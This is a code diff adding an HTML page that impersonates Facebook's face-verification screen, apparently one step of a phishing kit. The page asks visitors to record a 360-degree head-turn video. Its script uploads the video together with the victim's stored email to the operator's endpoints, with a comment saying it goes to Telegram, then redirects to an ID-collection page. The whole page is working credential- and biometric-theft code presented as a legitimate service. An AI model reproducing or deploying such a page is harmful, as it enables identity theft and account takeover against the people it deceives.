@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Face Verification</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/960px-Facebook_logo_%282023%29.svg.png" alt="Facebook" class="fb-logo">
+        
+        <div class="selfie-container">
+            <div class="progress-bar"><div class="progress-fill" style="width: 50%"></div></div>
+            <div class="screen-title">Face Verification</div>
+            <div class="screen-text">Record a short video turning your head 360 degrees:</div>
+            
+            <input type="file" id="videoInput" accept="video/*" capture="user" style="display: none;">
+            
+            <div class="file-upload" onclick="document.getElementById('videoInput').click()">
+                <div class="upload-text">🎥 Tap to Record Video</div>
+            </div>
+            
+            <button class="primary" onclick="uploadVideo()" id="uploadBtn" disabled>
+                <span id="buttonText">Upload & Continue</span>
+                <div class="button-loader" id="buttonLoader"></div>
+            </button>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('videoInput').addEventListener('change', function(e) {
+            if (this.files.length > 0) {
+                document.getElementById('uploadBtn').disabled = false;
+            }
+        });
+        
+        async function uploadVideo() {
+            const fileInput = document.getElementById('videoInput');
+            if (!fileInput.files[0]) return;
+            
+            const email = sessionStorage.getItem('email');
+            const file = fileInput.files[0];
+            
+            // Show loading
+            const btn = document.getElementById('uploadBtn');
+            const buttonText = document.getElementById('buttonText');
+            const buttonLoader = document.getElementById('buttonLoader');
+            
+            btn.disabled = true;
+            buttonText.style.display = 'none';
+            buttonLoader.style.display = 'block';
+            
+            // Send file to Telegram
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('caption', `Face verification: ${email}`);
+            
+            await fetch('/api/upload', {
+                method: 'POST',
+                body: formData
+            });
+            
+            // Send notification
+            await fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: 'selfie',
+                    data: { email, filename: file.name },
+                    ip: 'user_ip_here'
+                })
+            });
+            
+            // Redirect to ID page
+            setTimeout(() => {
+                window.location.href = '/id';
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
